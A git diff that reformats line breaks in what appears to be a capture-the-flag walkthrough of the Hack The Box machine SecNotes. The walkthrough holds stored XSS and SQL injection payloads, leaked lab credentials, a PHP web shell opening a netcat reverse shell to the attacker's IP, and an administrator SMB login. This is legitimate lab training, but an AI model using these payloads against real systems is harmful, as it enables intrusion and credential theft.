@@ -63,16 +63,16 @@ Nmap done: 1 IP address (1 host up) scanned in 150.12 seconds
 
 ## Port 80
 
-- There is a website in which we can register
-![image](https://user-images.githubusercontent.com/96747355/161392042-5ba00a95-a1a6-4fb3-b094-f50db3e8fd95.png)
-- There is also a message disclosing an email address
-![image](https://user-images.githubusercontent.com/96747355/161392138-71a2dd00-b6b2-40ad-9c7c-8f8253f0cfbd.png)
+- There is a website in which we can register  
+![image](https://user-images.githubusercontent.com/96747355/161392042-5ba00a95-a1a6-4fb3-b094-f50db3e8fd95.png)  
+- There is also a message disclosing an email address  
+![image](https://user-images.githubusercontent.com/96747355/161392138-71a2dd00-b6b2-40ad-9c7c-8f8253f0cfbd.png)  
 - So we keep it aside ` tyler@secnotes.htb` we can also edit our `/etc/hosts` file and add `10.10.10.97 secnotes.htb` in it  
 - No sqli in the login
-- Let's try on the register if we register a user with username `<script>alert(1)</script>` when we login with it after we have a stored xss:
-![image](https://user-images.githubusercontent.com/96747355/161392971-b25a15fc-5a56-4c1e-9647-40051f478fee.png)
+- Let's try on the register if we register a user with username `<script>alert(1)</script>` when we login with it after we have a stored xss:  
+![image](https://user-images.githubusercontent.com/96747355/161392971-b25a15fc-5a56-4c1e-9647-40051f478fee.png)  
 - So we need to investigate the username parameter and see if it might be vulnerable to sqli
-- Let's try with this `' or 1=1; --` we get an internal server error when trying to login with this after but if we register with `'OR 1 OR'` it actually works and we get all the tickets
+- Let's try with this `' or 1=1; --` we get an internal server error when trying to login with this after but if we register with `'OR 1 OR'` it actually works and we get all the tickets  
 ![image](https://user-images.githubusercontent.com/96747355/161393496-bd38b265-53ad-4c97-8cd9-34bcfc9298d6.png)  
 - We even get a user and password: `tyler / 92g!mA8BGjOirkL%OG*&` along with what looks like an smb folder so definetely worth trying to connect there `\\secnotes.htb\new-site`
 
@@ -105,8 +105,8 @@ smb: \> ls
 system('nc.exe -e cmd.exe 10.10.14.4 5555')
 ?>
 ```
-- We can then browse to the page, and we get a shell
-![image](https://user-images.githubusercontent.com/96747355/161402147-fa79ebc5-e6c1-48ca-9392-86c0870c3266.png)
+- We can then browse to the page, and we get a shell  
+![image](https://user-images.githubusercontent.com/96747355/161402147-fa79ebc5-e6c1-48ca-9392-86c0870c3266.png)  
 - We can then grab the user flag
 
 ## Privilege Escalation
@@ -128,8 +128,8 @@ c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1
 root
 ```
 - We are root
-- Let's launch the bash to get the shell
-![image](https://user-images.githubusercontent.com/96747355/161403022-8d3f3c2f-afc2-4b4f-b52b-a68f97217af5.png)
+- Let's launch the bash to get the shell  
+![image](https://user-images.githubusercontent.com/96747355/161403022-8d3f3c2f-afc2-4b4f-b52b-a68f97217af5.png)  
 Let's spawn a [tty shell](https://netsec.ws/?p=337)
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
@@ -164,5 +164,5 @@ history
 ```
 
 - We have the password for the admin por smbclient
-- ` smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$` And it works! We can actually connect as administrator to an smb share we just need to grab the flag
+- ` smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$` And it works! We can actually connect as administrator to an smb share we just need to grab the flag  
 ![image](https://user-images.githubusercontent.com/96747355/161403183-d7124822-5828-47fe-bfb3-7dc58440c1f6.png)
